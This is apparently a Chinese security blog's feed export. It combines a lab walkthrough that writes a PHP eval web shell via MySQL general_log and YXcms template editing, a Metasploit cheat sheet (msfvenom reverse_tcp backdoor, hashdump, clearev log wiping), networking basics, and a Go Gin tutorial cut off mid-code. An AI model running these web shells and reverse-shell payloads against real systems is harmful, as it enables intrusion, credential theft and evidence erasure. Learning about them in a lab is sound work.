title="phpMyAdmin日志拿Shell"></a>phpMyAdmin日志拿Shell</h3><blockquote><p>访问 <a href="http://192.168.254.135/">http://192.168.254.135/</a> </p></blockquote><p>phpStudy 探针页面，泄露了网站路径，可尝试配合 phpMyAdmin getshell。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308141810837.png" alt="image-20230814181014670"></p><p>MySql 连接测试处发现弱口令 <code>root/root</code> ，但 MySql 无法外连。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308141811076.png" alt="image-20230814181156044"></p><blockquote><p>访问 <a href="http://192.168.254.135/phpMyAdmin/">http://192.168.254.135/phpMyAdmin/</a> </p></blockquote><p>弱口令 <code>root/root</code> 进后台，查看 <code>secure_file_priv</code> 值：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308141816077.png" alt="image-20230814181625016"></p><p> <code>secure_file_priv</code> 值为 <code>null</code>，不能写入文件，尝试日志拿 shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 查看日志信息<br>SHOW VARIABLES LIKE &#x27;%general%&#x27;;<br># 开启日志<br>set global general_log = on;<br># 设置日志存储路径<br>SET GLOBAL general_log_file=&#x27;C:/phpStudy/WWW/index.php&#x27;;<br># 写入 shell<br>select &#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;<br></code></pre></td></tr></table></figure><p>使用蚁剑连接 shell：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308141838148.png" alt="image-20230814183834974"></p><h3 id="YXcms模板编辑拿Shell"><a href="#YXcms模板编辑拿Shell" class="headerlink" title="YXcms模板编辑拿Shell"></a>YXcms模板编辑拿Shell</h3><p>进行文件浏览时发现有一个 yxcms 站点：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308141840495.png" alt="image-20230814184029393"></p><blockquote><p><a href="http://192.168.254.135/yxcms/">http://192.168.254.135/yxcms/</a></p></blockquote><p>发现公告中泄露了后台地址和账号密码：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308141842277.png" alt="image-20230814184200252" style="zoom:67%;" /><blockquote><p><a href="http://192.168.254.135/yxcms/index.php?r=admin/index/login">http://192.168.254.135/yxcms/index.php?r=admin/index/login</a></p></blockquote><p>登录后台后可通过编辑模板文件拿 Shell：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308151025317.png" alt="image-20230815102538030"></p><p>在 info.php 中写 shell：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308151026990.png" alt="image-20230815102625825"></p><p>写入 Shell 后发现没有返回文件的路径，这里是通过 robots.txt 泄露了路径，而且可以一步步点进去查看，最终找到了路径：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308151031851.png" alt="image-20230815103102819"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308151031089.png" alt="image-20230815103123987"></p><p>最终路径：<a href="http://192.168.254.135/yxcms/protected/apps/default/view/default/info.php">http://192.168.254.135/yxcms/protected/apps/default/view/default/info.php</a></p><p>不过最后发现其实 <a href="http://192.168.254.135/yxcms/info.php">http://192.168.254.135/yxcms/info.php</a> 也可以直接访问到 info.php。</p><p>再次拿下 Shell：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308151031450.png" alt="image-20230815103147364"></p><p>在这种无法获取模板文件路径的情况下，主要有 3 种解决办法：</p><ol><li>程序源码</li><li>根据模板内容寻找到对应的页面</li><li>路径泄露</li><li>瞎猜</li></ol><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>webShell 直接就是管理员，直接上 MSF 进行信息收集：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308151058829.png" alt="image-20230815105844792"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.254.128 <span class="hljs-attribute">lport</span>=4444 -f exe -o msf.exe<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308151040430.png" alt="image-20230815104030342"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler <br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lport 4444<br><span class="hljs-built_in">set</span> lhost 0.0.0.0<br>run<br></code></pre></td></tr></table></figure><h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dos">shell<br><span class="hljs-built_in">chcp</span> <span class="hljs-number">65001</span><br><span class="hljs-built_in">net</span> config workstation<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Metasploit</title>
    <link href="/2023/08/14/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/Metasploit/"/>
    <url>/2023/08/14/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/Metasploit/</url>
    
    <content type="html"><![CDATA[<h1 id="MetaSploit"><a href="#MetaSploit" class="headerlink" title="MetaSploit"></a>MetaSploit</h1><h2 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/rapid7/m</span>etasploit-omnibus<span class="hljs-regexp">/master/</span>config<span class="hljs-regexp">/templates/m</span>etasploit-framework-wrappers/msfupdate.erb &gt; msfinstall<br>chmod <span class="hljs-number">777</span> msfinstall<br>./msfinstall<br>msfconsole<br></code></pre></td></tr></table></figure><h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>使用 <code>msfvenom</code> 进行 msf 后门生成，工具参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">-p# 指定需要使用的payload(攻击荷载)<br>-l# 列出指定模块的所有可用资源<br>-n# 为payload预先指定一个NOP滑动长度<br>-f# 指定输出格式<br>-e# 指定需要使用的encoder编码器<br>-a# 指定payload的目标架构<br>-s# 设定有效攻击荷载的最大长度<br>-b  # 设定规避字符集<br>-i  # 指定payload的编码次数<br>--platform# 指定payload的目标平台<br>--shellest  # 最小化生成payloa<br></code></pre></td></tr></table></figure><p>生成后门：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.254.128 <span class="hljs-attribute">lport</span>=4444 -f exe -o msf.exe<br></code></pre></td></tr></table></figure><p>启动监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">use  exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 0.0.0.0<br>set LPORT 4444<br>exploit<br></code></pre></td></tr></table></figure><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">启动MSF</span><br>msfconsole<br><span class="hljs-meta prompt_"># </span><span class="language-bash">搜索某个模块</span><br>search ms08-067<br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用某个模块, 也可以使用 search 后的 <span class="hljs-built_in">id</span></span><br>use exploit/windows/smb/ms08-067_netapi<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看当前模块可以使用的payload</span><br>show payloads<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看当前模块需要的参数配置</span><br>show options<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置 payload</span><br>set payload windows/meterpreter/reverse_tcp<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置目标的IP地址</span><br>set RHOST 192.168.10.1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置本地的IP地址</span><br>set LHOST 192.168.1.1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置本地的监听端口</span><br>set LPORT 8888<br><span class="hljs-meta prompt_"># </span><span class="language-bash">开始</span><br>run<br></code></pre></td></tr></table></figure><h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>在获取 Shell 后可以使用的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">挂起</span><br>background<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看会话</span><br>sessions<br><span class="hljs-meta prompt_"># </span><span class="language-bash">进入该会话</span><br>sessions -i id<br><span class="hljs-meta prompt_"># </span><span class="language-bash">获取远程命令执行 Shell, 可用 <span class="hljs-built_in">exit</span> 退出</span><br>shell<br><span class="hljs-meta prompt_"># </span><span class="language-bash">解决 windows shell 乱码</span><br>chcp 65001<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看</span><br>cat<br><span class="hljs-meta prompt_"># </span><span class="language-bash">获取系统工作的当前目录</span><br>getwd<br><span class="hljs-meta prompt_"># </span><span class="language-bash">文件上传</span><br>upload [要上传的文件] [要上传的位置]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">文件下载</span><br>download [要下载的文件] [下载放到那]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">调用 vi 编辑器</span><br>edit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">搜索文件</span><br>search<br><span class="hljs-meta prompt_"># </span><span class="language-bash">端口转发</span><br>portfwd add -l 1122 -p 3389 -r 192.168.10.1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看路由</span><br>route<br><span class="hljs-meta prompt_"># </span><span class="language-bash">获取当前用户信息</span><br>getuid<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看系统信息</span><br>sysinfo<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看</span><br>ps<br><span class="hljs-meta prompt_"># </span><span class="language-bash">进程迁移 ps 查看进程, migrate 迁移</span><br>migrate<br><span class="hljs-meta prompt_"># </span><span class="language-bash">运行可执行文件</span><br>execute -f -i -H cmd.exe<br><span class="hljs-meta prompt_"># </span><span class="language-bash">关闭</span><br>shutdown<br><span class="hljs-meta prompt_"># </span><span class="language-bash">尝试提权</span><br>getsystem<br><span class="hljs-meta prompt_"># </span><span class="language-bash">获取 <span class="hljs-built_in">hash</span> 信息</span><br>hashdump<br><span class="hljs-meta prompt_"># </span><span class="language-bash">入侵痕迹清除</span><br>clearev<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>安全工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透基础</title>
    <link href="/2023/08/13/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/08/13/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透基础"><a href="#渗透基础" class="headerlink" title="渗透基础"></a>渗透基础</h1><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>IP 地址：是互联网上计算机唯一的逻辑地址，通过 IP 地址实现不同计算机之间的相互通信；</p><p>域名：域名可以看作是 IP 地址的名字，IP 地址不好记忆且没有标识性，而通过域名更有标识性更加好用；</p><p>DNS：它就是连接在域名和 IP 之间的系统，可以将域名解析成 IP 地址；</p><p>子域名：一个根域名可以有很多子域名，而在进行渗透测试的时候，一些目标网站的规模比较大，主站会进行重点防御，安全性强，下手难度高。通过子域名探测，可以对目标网站下发现更多的域或子域，大大提高漏洞发现的概率，再通过这些子域，接近真正的目标；</p><p>域名解析过程：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302211460.png" alt="image-20230830221117344"></p><p>host 文件：这里的 “检查本机系统是否缓存” 就是检测 host 文件；</p><p>host 文件位置：</p><table><thead><tr><th>系统</th><th>路径</th><th>刷新</th></tr></thead><tbody><tr><td><code>windows</code></td><td><code>C:\Windows\System32\drivers\etc\hosts</code></td><td><code>ipconfig /flushdns</code></td></tr><tr><td><code>linux</code></td><td><code>/etc/hosts</code></td><td><code>systemctl restart nscd</code></td></tr></tbody></table><p>host 文件内容：IP 域名 的形式</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302214764.png" alt="image-20230830221430743"></p><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>HTTP：超文本传输协议，基于TCP&#x2F;IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）</p><p>HTTP 遵循请求（Request）&#x2F;应答（Respose）模型，Web浏览器向Web服务器发送请求时，Web服务器处理请求并返回适当的响应。此请求只能由客户端发起，服务器不能主动向客户端发送数据；</p><p>统一资源标识符（URL）：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302218616.png" alt="image-20230830221802566"></p><p>请求：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302217983.png" alt="image-20230830221714963"></p><p>响应：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302217987.png" alt="image-20230830221726955"></p><p>请求方法：</p><ul><li>get</li><li>post</li><li>header</li><li>put</li><li>delete</li><li>connect</li><li>options</li></ul><p>状态码：</p><ul><li>1xx：请求成功，继续处理</li><li>2xx：请求成功，处理成功</li><li>3xx：重定向</li><li>4xx：客户端错误</li><li>5xx：服务端错误</li></ul><p>常见状态码：</p><ul><li>200 : 客户端请求成功</li><li>302： 重定向</li><li>404 : 请求资源不存在</li><li>400 : 客户端请求有语法错误,不能被服务器所理解</li><li>401 : 请求未经授权</li><li>403 : 服务器收到请求,但拒绝提供服务</li><li>500 : 服务器内部错误</li><li>503 : 服务器当前不能处理客户端的请求,一段时间后可能恢复正常</li></ul><p>请求头：</p><ul><li>Host：请求的服务器的域名和端口号</li><li>User-Agent：客户端标识（ 操作系统、浏览器 ）</li><li>Origin：谁发起的请求</li><li>Referer：先前的 URL</li><li>Cookie：身份验证信息</li><li>x-forward-for：请求端 IP （ 可伪造 ）</li><li>Accept：指定客户端接收那些MIME类型的信息</li><li>Accept-Charset：指定客户端接收的字符集</li><li>Accept-Encoding：指定浏览器可以支持的 web 服务器返回内容压缩编码类型</li><li>Accept-Language：指定浏览器可接受的语言 </li><li>Connection：表示是否需要持久连接</li><li>Authorization：授权的授权证书</li></ul><p>响应头：</p><ul><li>Server：web 服务器软件名称</li><li>Set-Cookie：向客户端设置 cookie，服务器向客户端发送的Cookie信息</li><li>Location：重定向</li><li>Refresh：应用于重定向或一个新的资源被创造，在 5 秒之后重定向</li><li>Content-Type：返回内容的 MIME 类型</li></ul><h2 id="https"><a href="#https" class="headerlink" title="https"></a>https</h2><p>超文本传输安全协议，比HTTP（超文本传输协议）多了个安全，其实就是HTTP的升级版本，只是它比HTTP更加安全。</p><p>HTTPS 安全的基础是 SSL，即在 HTTP 下加入 SSL层，也就是 HTTPS 通过安全传输机制进行传送数据，这种机制可包含网络传送的所有数据的隐秘性与完整性，可以降低非入侵型拦截攻击的可能性。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302231264.png" alt="image-20230830223135226"></p><p>SSL 证书部署：<a href="https://cloud.tencent.com/document/product/400/4143">https://cloud.tencent.com/document/product/400/4143</a></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>web 环境组成：</p><ul><li>操作系统：linux，windows</li><li>中间件（ web 服务器）：nginx，apache，iis….</li><li>数据库：MySQL，SQL Server，Access，Oracle，DB2，PostgreSQL</li><li>后端程序：由脚本语言编写程序实现功能，web服务器实现解析，从而使网站实现功能，如：PHP，ASP，Java，</li><li>前端页面：由浏览器解析（就是我们平常看见的网站界面），如：HTML，CSS，JavaScript…</li></ul><p>工作流程：</p><ul><li>浏览器向服务器发送请求，服务器接收请求后进行判断，如果是静态文本，服务器直接做出相应响应返回给浏览器；否则让脚本语言进行解析，不涉及数据库的话就返回相应内容；涉及数据库，就执行相应操作再返回。</li></ul><p>具体流程：</p><ol><li>浏览器解析 URL</li><li>生成 HTTP 请求</li><li>解析 IP 地址</li><li>TCP 三次握手建立连接</li><li>发送 HTTP 请求</li><li>服务端处理请求</li><li>服务端返回响应</li><li>TCP 四次挥手关闭连接</li></ol><h2 id="cdn"><a href="#cdn" class="headerlink" title="cdn"></a>cdn</h2><p>CDN：内容分发网络，为了提高访问速度而产生。</p><p>原理：</p><ul><li>访问域名时，通过DNS分查找离用户最近的CDN节点（边缘服务器）的IP，访问离自己近的IP肯定要比远的要快，以此提供访问速度（那个地区的就访问自己地区或离自己近的IP，这样就快了，如下图）</li></ul><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308302238754.png" alt="image-20230830223833711"></p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><ul><li>存储加密：md5、sha、aes</li><li>传输加密：base</li><li>代码加密：js 加密、后端加密</li><li>数据显示：utf8、gbk</li><li>其他：jwt（ cookie 中的 3 段形式，使用 . 分割，可爆破 Key ）</li></ul><p>识别编码：<a href="https://gitee.com/link?target=https://www.dcode.fr/identification-chiffrement">https://www.dcode.fr/identification-chiffrement</a> </p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go Gin 框架</title>
    <link href="/2023/08/13/WEB%E5%BC%80%E5%8F%91/Gin%E6%A1%86%E6%9E%B6/"/>
    <url>/2023/08/13/WEB%E5%BC%80%E5%8F%91/Gin%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="Go-Gin-框架"><a href="#Go-Gin-框架" class="headerlink" title="Go Gin 框架"></a>Go Gin 框架</h1><p>官方地址：<a href="https://github.com/gin-gonic/gin">https://github.com/gin-gonic/gin</a></p><p>中文API：<a href="https://gin-gonic.com/zh-cn/docs/">https://gin-gonic.com/zh-cn/docs/</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span> <span class="hljs-built_in">get</span> -<span class="hljs-keyword">u</span> github.<span class="hljs-keyword">com</span>/gin-gonic/gin<br></code></pre></td></tr></table></figure><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br><span class="hljs-comment">// gin.Context - 把请求和响应都封装到gin.Context上下文环境中</span><br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;hello gin !&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 获取引擎</span><br>r := gin.Default()<br><span class="hljs-comment">// 路由 GET方法请求&quot;/&quot;路径，执行func(...)函数，这里也可以使用匿名函数</span><br>r.GET(<span class="hljs-string">&quot;/&quot;</span>, hello)<br><span class="hljs-comment">// 启动引擎</span><br>r.Run()<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Default()</code> 底层调用了<code>New()</code>，相当于<code>New()</code>的升级，<code>New()</code>返回的是一个引擎。</p><p><code>Default()</code>在此基础上多增加了两个中间件<code>Logger(), Recovery()</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Default</span><span class="hljs-params">()</span></span> *Engine &#123;<br>debugPrintWARNINGDefault()<br>engine := New()<br>    <span class="hljs-comment">// 使用中间件 日志,错误处理</span><br>engine.Use(Logger(), Recovery())<br><span class="hljs-keyword">return</span> engine<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Default()</code>返回的是一个引擎 <code>Engine</code>，它是框架非常重要的数据结构，是框架的入口。</p><p><code>r.Run(ip:port) =&gt; r.Run(127.0.0.1:80) =&gt; r.Run(:80)</code> 默认为 8080 端口</p><h2 id="文件交互"><a href="#文件交互" class="headerlink" title="文件交互"></a>文件交互</h2><p>模板文件：HTML</p><p>静态文件：CSS、JS、图片…</p><h3 id="模板文件"><a href="#模板文件" class="headerlink" title="模板文件"></a>模板文件</h3><p>使用 HTML 模板文件：</p><ol><li>先引入模板文件</li><li>再渲染模板文件（ 相对路径 ）</li></ol><h4 id="引入HTML模板文件"><a href="#引入HTML模板文件" class="headerlink" title="引入HTML模板文件"></a>引入HTML模板文件</h4><ul><li>指定的HTML文件：<code>LoadHTMLFiles(files ...string)</code></li><li>指定文件夹下的所有HTML文件：<code>LoadHTMLGlob(pattern string)</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">r.LoadHTMLFiles(<span class="hljs-string">&quot;templates/hello1.html&quot;</span>, <span class="hljs-string">&quot;templates/hello2.html&quot;</span>)<span class="hljs-comment">// 不推荐</span><br>r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/*&quot;</span>)<span class="hljs-comment">// 推荐</span><br></code></pre></td></tr></table></figure><h4 id="渲染HTML模板文件"><a href="#渲染HTML模板文件" class="headerlink" title="渲染HTML模板文件"></a>渲染HTML模板文件</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Context)</span></span> HTML(code <span class="hljs-type">int</span>, name <span class="hljs-type">string</span>, obj any)<br></code></pre></td></tr></table></figure><ul><li>code：状态码</li><li>name：HTML文件名</li><li>obj：传入参数，空接口可以接受任意类型，没有的话为 nil</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>context.HTML(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;hello1.html&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/*&quot;</span>)<br>r.GET(<span class="hljs-string">&quot;/hello1&quot;</span>, hello)<br>r.Run()<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="多级目录"><a href="#多级目录" class="headerlink" title="多级目录"></a>多级目录</h4><p>当HTML文件位于多个不同的子目录时，需要如下修改，才能正常引入：</p><ol><li><code>LoadHTMLGlob</code> 指定多级目录通配符</li><li><code>context.HTML</code> 指定路径（ 除第一级目录不指定 ）</li><li>在对应的HTML文件中，<code>define</code> 路径文件名</li></ol><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051400435.png" alt="image-20230401211928220"></p><ol><li>有几级目录，得在通配符上指明，<code>/**/</code> 表示任意子目录</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/**/*&quot;</span>)<br></code></pre></td></tr></table></figure><ol start="2"><li>指定html文件，除了第一级的templates路径不需要指定，后面的路径都要指定</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">context.HTML(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;dome1/hello1.html&quot;</span>, <span class="hljs-literal">nil</span>)<br></code></pre></td></tr></table></figure><ol start="3"><li>在HTML中，定义 <code>define</code> 和 <code>end</code> ：</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;&#123;define &quot;dome1/hello1.html&quot;&#125;&#125;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>....<br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>&#123;&#123;end&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello1</span><span class="hljs-params">(context 